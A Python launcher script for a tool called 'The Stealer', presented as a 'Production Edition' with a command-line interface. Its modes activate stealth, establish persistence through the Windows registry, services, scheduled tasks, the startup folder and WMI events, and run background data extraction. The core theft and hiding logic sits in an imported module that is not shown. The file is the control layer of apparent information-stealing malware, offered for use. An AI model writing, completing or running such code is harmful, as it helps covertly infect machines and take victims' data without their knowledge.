#!/usr/bin/env python3
"""
The Stealer - Production Launcher
Advanced launcher script with stealth activation and persistence establishment.
"""

import os
import sys
import asyncio
import argparse
import logging
from pathlib import Path

# Add current directory to path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from main_enhanced_final import StealerApplicationEnhanced, ApplicationConfig

class StealerLauncher:
    """
    Production launcher for The Stealer with advanced features.
    """
    
    def __init__(self):
        """Initialize the launcher."""
        self.logger = self._setup_logging()
        
    def _setup_logging(self) -> logging.Logger:
        """Setup logging for launcher."""
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('launcher.log'),
                logging.StreamHandler()
            ]
        )
        return logging.getLogger(__name__)
    
    async def launch_production_mode(self, config_path: str = None):
        """
        Launch The Stealer in production mode with all features enabled.
        
        Args:
            config_path: Path to configuration file
        """
        try:
            self.logger.info("🚀 Launching The Stealer in Production Mode")
            
            # Create application configuration
            config = ApplicationConfig(
                config_file=config_path or 'config/settings.yaml',
                debug_mode=False,
                gui_enabled=True
            )
            
            # Create application
            app = StealerApplicationEnhanced(config)
            
            # Initialize application
            await app.initialize()
            
            # Activate stealth mode
            self.logger.info("🕵️ Activating stealth mode...")
            stealth_success = await app.activate_stealth()
            if stealth_success:
                self.logger.info("✅ Stealth mode activated")
            else:
                self.logger.warning("⚠️ Stealth mode activation failed")
            
            # Establish persistence
            self.logger.info("🔗 Establishing persistence...")
            persistence_methods = ['registry', 'services', 'scheduled_tasks', 'startup_folder']
            persistence_results = await app.establish_persistence(persistence_methods)
            
            successful_persistence = [method for method, success in persistence_results.items() if success]
            if successful_persistence:
                self.logger.info(f"✅ Persistence established: {successful_persistence}")
            else:
                self.logger.warning("⚠️ Persistence establishment failed")
            
            # Start main application
            self.logger.info("🎯 Starting main application...")
            app.run_gui()
            
        except Exception as e:
            self.logger.error(f"❌ Production launch failed: {e}")
            raise
    
    async def launch_stealth_mode(self, config_path: str = None):
        """
        Launch The Stealer in stealth mode only.
        
        Args:
            config_path: Path to configuration file
        """
        try:
            self.logger.info("🕵️ Launching The Stealer in Stealth Mode")
            
            # Create application configuration
            config = ApplicationConfig(
                config_file=config_path or 'config/settings.yaml',
                debug_mode=False,
                gui_enabled=False
            )
            
            # Create application
            app = StealerApplicationEnhanced(config)
            
            # Initialize application
            await app.initialize()
            
            # Activate stealth mode
            stealth_success = await app.activate_stealth()
            if stealth_success:
                self.logger.info("✅ Stealth mode activated")
            else:
                self.logger.warning("⚠️ Stealth mode activation failed")
            
            # Run extraction in background
            self.logger.info("🔍 Starting background data extraction...")
            extraction_result = await app.run_extraction("data/extracted")
            
            if extraction_result['success']:
                self.logger.info("✅ Data extraction completed")
            else:
                self.logger.error(f"❌ Data extraction failed: {extraction_result.get('error')}")
            
        except Exception as e:
            self.logger.error(f"❌ Stealth launch failed: {e}")
            raise
    
    async def launch_persistence_mode(self, config_path: str = None):
        """
        Launch The Stealer in persistence mode only.
        
        Args:
            config_path: Path to configuration file
        """
        try:
            self.logger.info("🔗 Launching The Stealer in Persistence Mode")
            
            # Create application configuration
            config = ApplicationConfig(
                config_file=config_path or 'config/settings.yaml',
                debug_mode=False,
                gui_enabled=False
            )
            
            # Create application
            app = StealerApplicationEnhanced(config)
            
            # Initialize application
            await app.initialize()
            
            # Establish persistence
            persistence_methods = ['registry', 'services', 'scheduled_tasks', 'startup_folder', 'wmi_events']
            persistence_results = await app.establish_persistence(persistence_methods)
            
            successful_persistence = [method for method, success in persistence_results.items() if success]
            if successful_persistence:
                self.logger.info(f"✅ Persistence established: {successful_persistence}")
            else:
                self.logger.warning("⚠️ Persistence establishment failed")
            
            self.logger.info("🎯 Persistence mode completed - application will restart automatically")
            
        except Exception as e:
            self.logger.error(f"❌ Persistence launch failed: {e}")
            raise
    
    async def launch_extraction_mode(self, target_path: str, config_path: str = None):
        """
        Launch The Stealer in extraction mode only.
        
        Args:
            target_path: Path to save extracted data
            config_path: Path to configuration file
        """
        try:
            self.logger.info(f"🔍 Launching The Stealer in Extraction Mode - Target: {target_path}")
            
            # Create application configuration
            config = ApplicationConfig(
                config_file=config_path or 'config/settings.yaml',
                debug_mode=False,
                gui_enabled=False
            )
            
            # Create application
            app = StealerApplicationEnhanced(config)
            
            # Initialize application
            await app.initialize()
            
            # Run extraction
            extraction_result = await app.run_extraction(target_path)
            
            if extraction_result['success']:
                self.logger.info("✅ Data extraction completed successfully")
                self.logger.info(f"📊 Summary: {extraction_result['summary']}")
            else:
                self.logger.error(f"❌ Data extraction failed: {extraction_result.get('error')}")
            
        except Exception as e:
            self.logger.error(f"❌ Extraction launch failed: {e}")
            raise

async def main():
    """Main launcher function."""
    parser = argparse.ArgumentParser(description="The Stealer - Production Launcher")
    parser.add_argument('--mode', choices=['production', 'stealth', 'persistence', 'extraction'], 
                       default='production', help='Launch mode')
    parser.add_argument('--config', help='Configuration file path')
    parser.add_argument('--target', help='Target path for extraction mode')
    parser.add_argument('--version', action='store_true', help='Show version information')
    
    args = parser.parse_args()
    
    # Show version information
    if args.version:
        print("The Stealer - Production Edition v2.0")
        print("Developed by: Akki (Akhand Raj)")
        print("License: MIT")
        print("Professional Data Extraction Platform")
        return
    
    # Create launcher
    launcher = StealerLauncher()
    
    try:
        # Launch based on mode
        if args.mode == 'production':
            await launcher.launch_production_mode(args.config)
        elif args.mode == 'stealth':
            await launcher.launch_stealth_mode(args.config)
        elif args.mode == 'persistence':
            await launcher.launch_persistence_mode(args.config)
        elif args.mode == 'extraction':
            if not args.target:
                print("Error: --target is required for extraction mode")
                return
            await launcher.launch_extraction_mode(args.target, args.config)
    
    except KeyboardInterrupt:
        print("\n⚠️ Launch interrupted by user")
        logging.info("Launch interrupted by user")
    
    except Exception as e:
        print(f"❌ Launch error: {e}")
        logging.error(f"Launch error: {e}")

if __name__ == "__main__":
    # Run the launcher
    asyncio.run(main())